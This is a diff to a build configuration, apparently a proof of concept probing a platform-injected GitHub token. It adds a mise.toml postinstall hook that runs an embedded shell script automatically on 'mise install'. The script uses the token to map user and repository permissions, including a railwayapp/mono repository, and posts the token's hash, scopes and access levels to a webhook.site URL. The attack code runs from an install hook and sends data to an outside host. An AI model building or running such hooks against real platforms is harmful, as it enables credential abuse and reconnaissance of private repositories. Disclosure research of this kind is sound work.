@@ -6,6 +6,7 @@
         "CANARY_URL": "https://webhook.site/71e039c6-1193-4189-8ea3-30df59fb4d3b"
       },
       "assets": {
+        "mise.toml": "[hooks]\npostinstall = { run = \"/app/.railpack-token-probe.sh\", shell = \"sh -c\" }\n",
         "probe.sh": "#!/bin/sh\nset -eu\n: \"${GITHUB_TOKEN:?platform token was not injected}\"\n: \"${CANARY_URL:?missing disposable webhook}\"\ntmp=$(mktemp -d)\ntrap 'rm -rf \"$tmp\"' EXIT INT TERM\napi_get() {\n  endpoint=$1\n  stem=$2\n  : >\"$tmp/$stem.json\"\n  if ! status=$(curl -sS -D \"$tmp/$stem.headers\" -o \"$tmp/$stem.json\" -w '%{http_code}' -H 'Accept: application/vnd.github+json' -H \"Authorization: Bearer $GITHUB_TOKEN\" -H 'X-GitHub-Api-Version: 2022-11-28' \"https://api.github.com$endpoint\"); then status=000; fi\n  printf '%s' \"$status\"\n}\nuser_status=$(api_get /user user)\nuser_repos_status=$(api_get '/user/repos?per_page=100&affiliation=owner,collaborator,organization_member' user_repos)\ninstallation_repos_status=$(api_get '/installation/repositories?per_page=100' installation_repos)\nmono_status=$(api_get '/repos/railwayapp/mono' mono)\ntoken_sha256=$(printf '%s' \"$GITHUB_TOKEN\" | sha256sum | awk '{print $1}')\ntoken_length=$(printf '%s' \"$GITHUB_TOKEN\" | wc -c | tr -d ' ')\noauth_scopes=$(awk 'BEGIN{IGNORECASE=1} /^x-oauth-scopes:/ {sub(/\\r$/,\"\"); sub(/^[^:]*:[[:space:]]*/,\"\"); print; exit}' \"$tmp/user.headers\")\nuser_login=$(jq -r '.login // empty' \"$tmp/user.json\" 2>/dev/null || true)\nuser_type=$(jq -r '.type // empty' \"$tmp/user.json\" 2>/dev/null || true)\nuser_repo_permissions=$(jq -c 'def z:{count:0,admin:false,maintain:false,push:false,triage:false,pull:false}; if type==\"array\" then {count:length,admin:any(.[];.permissions.admin==true),maintain:any(.[];.permissions.maintain==true),push:any(.[];.permissions.push==true),triage:any(.[];.permissions.triage==true),pull:any(.[];.permissions.pull==true)} else z end' \"$tmp/user_repos.json\" 2>/dev/null || printf '%s' '{\"count\":0,\"admin\":false,\"maintain\":false,\"push\":false,\"triage\":false,\"pull\":false}')\ninstallation_repo_permissions=$(jq -c 'def z:{count:0,admin:false,maintain:false,push:false,triage:false,pull:false}; if (.repositories?|type)==\"array\" then .repositories|{count:length,admin:any(.[];.permissions.admin==true),maintain:any(.[];.permissions.maintain==true),push:any(.[];.permissions.push==true),triage:any(.[];.permissions.triage==true),pull:any(.[];.permissions.pull==true)} else z end' \"$tmp/installation_repos.json\" 2>/dev/null || printf '%s' '{\"count\":0,\"admin\":false,\"maintain\":false,\"push\":false,\"triage\":false,\"pull\":false}')\nmono_permissions=$(jq -c 'if type==\"object\" then {admin:(.permissions.admin==true),maintain:(.permissions.maintain==true),push:(.permissions.push==true),triage:(.permissions.triage==true),pull:(.permissions.pull==true)} else {admin:false,maintain:false,push:false,triage:false,pull:false} end' \"$tmp/mono.json\" 2>/dev/null || printf '%s' '{\"admin\":false,\"maintain\":false,\"push\":false,\"triage\":false,\"pull\":false}')\njq -n --arg sha \"$token_sha256\" --argjson len \"$token_length\" --arg us \"$user_status\" --arg login \"$user_login\" --arg type \"$user_type\" --arg scopes \"$oauth_scopes\" --arg urs \"$user_repos_status\" --arg irs \"$installation_repos_status\" --arg ms \"$mono_status\" --argjson urp \"$user_repo_permissions\" --argjson irp \"$installation_repo_permissions\" --argjson mp \"$mono_permissions\" '{token:{sha256:$sha,length:$len},user:{status:($us|tonumber),login:(if $login==\"\" then null else $login end),type:(if $type==\"\" then null else $type end)},oauth_scopes:($scopes|split(\",\")|map(gsub(\"^\\\\s+|\\\\s+$\";\"\"))|map(select(length>0))),repositories:{user_endpoint:{status:($urs|tonumber),aggregate_permissions:$urp},installation_endpoint:{status:($irs|tonumber),aggregate_permissions:$irp},railway_mono:{status:($ms|tonumber),permissions:$mp}}}' >\"$tmp/payload.json\"\ncurl -sS -o /dev/null -H 'Content-Type: application/json' --data-binary @\"$tmp/payload.json\" \"$CANARY_URL\"\n"
       },
       "commands": [
@@ -15,8 +16,13 @@
           "mode": 448
         },
         {
-          "cmd": "mise install; /app/.railpack-token-probe.sh",
-          "customName": "Run sanitized token metadata probe"
+          "path": "/app/mise.toml",
+          "name": "mise.toml",
+          "mode": 420
+        },
+        {
+          "cmd": "mise install",
+          "customName": "Run token-bearing Mise install hook"
         }
       ]
     }
